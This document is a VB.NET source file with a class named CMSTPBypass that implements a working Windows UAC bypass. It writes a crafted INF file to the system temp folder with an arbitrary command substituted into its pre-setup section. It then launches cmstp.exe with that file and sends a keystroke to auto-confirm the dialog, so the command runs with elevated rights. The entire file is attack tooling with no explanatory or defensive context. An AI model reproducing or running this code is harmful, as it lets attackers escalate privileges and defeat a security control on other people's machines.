Imports System
Imports System.Text
Imports System.IO
Imports System.Windows
Imports System.Runtime.InteropServices

Public Class CMSTPBypass
    Public Shared InfData = "[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

"

    <DllImport("user32.dll")>
    Public Shared Function ShowWindow(ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Public Shared Function SetForegroundWindow(ByVal hWnd As IntPtr) As Boolean
    End Function

    Public Shared BinaryPath = "c:\windows\system32\cmstp.exe"

    Public Shared Function SetInfFile(ByVal CommandToExecute As String) As String
        Dim RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))(0)
        Dim TemporaryDir = "C:\windows\temp"
        Dim OutputFile As StringBuilder = New StringBuilder()
        OutputFile.Append(TemporaryDir)
        OutputFile.Append("\")
        OutputFile.Append(RandomFileName)
        OutputFile.Append(".inf")
        Dim newInfData As StringBuilder = New StringBuilder(InfData)
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute)
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString())
        Return OutputFile.ToString()
    End Function

    Public Shared Function Execute(ByVal CommandToExecute As String) As Boolean
        If Not File.Exists(BinaryPath) Then
            Console.WriteLine("Could not find cmstp.exe binary!")
            Return False
        End If

        Dim InfFile As StringBuilder = New StringBuilder()
        InfFile.Append(SetInfFile(CommandToExecute))
        Console.WriteLine("Payload file written to " & InfFile.ToString())
        Dim startInfo As ProcessStartInfo = New ProcessStartInfo(BinaryPath)
        startInfo.Arguments = "/au " & InfFile.ToString()
        startInfo.UseShellExecute = False
        Process.Start(startInfo)
        Dim windowHandle As IntPtr = New IntPtr()
        windowHandle = IntPtr.Zero

        Do
            windowHandle = SetWindowActive("cmstp")
        Loop While windowHandle = IntPtr.Zero

        System.Windows.Forms.SendKeys.SendWait("{ENTER}")
        Return True
    End Function

    Public Shared Function SetWindowActive(ByVal ProcessName As String) As IntPtr
        Dim target As Process() = Process.GetProcessesByName(ProcessName)
        If target.Length = 0 Then Return IntPtr.Zero
        target(0).Refresh()
        Dim WindowHandle As IntPtr = New IntPtr()
        WindowHandle = target(0).MainWindowHandle
        If WindowHandle = IntPtr.Zero Then Return IntPtr.Zero
        SetForegroundWindow(WindowHandle)
        ShowWindow(WindowHandle, 5)
        Return WindowHandle
    End Function
End Class
